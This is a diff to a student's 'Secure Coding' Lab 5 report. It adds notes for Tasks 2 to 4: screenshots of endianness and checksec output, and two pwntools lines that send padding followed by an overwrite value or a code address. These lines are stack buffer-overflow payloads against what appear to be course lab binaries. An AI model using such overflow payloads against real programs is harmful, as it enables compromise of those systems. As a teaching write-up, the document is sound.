@@ -4,9 +4,9 @@ Secure Coding
 
 Lab 5
 
-1. 
+### Task 1
 
-- Edianness: 
+- Endianness: 
 
 ![](image-1.png)
 
@@ -36,4 +36,49 @@ print(io.recvall().decode())
 
 
 
-2. 
+### Task 2
+
+- Endianness
+
+![](image-4.png)
+
+
+- checksec
+
+![](image-6.png)
+
+```c
+io.sendlineafter(b':', b'A' * 25 + b'\x11\xfa\xad\xde')
+```
+
+![Successful Overflow](image-3.png)
+
+
+
+### Task 3
+
+- Endianness
+
+![](image-5.png)
+
+- Checksec
+
+![](image-7.png)
+
+```c
+io.sendlineafter(b':', b'A' * 32 + b'\xc6\x91\x04\x08')
+```
+
+![Successful Overflow](image-8.png)
+
+
+### Task 4
+
+- Endianness
+
+![](image-9.png)
+
+- checksec
+
+![](image-10.png)
+
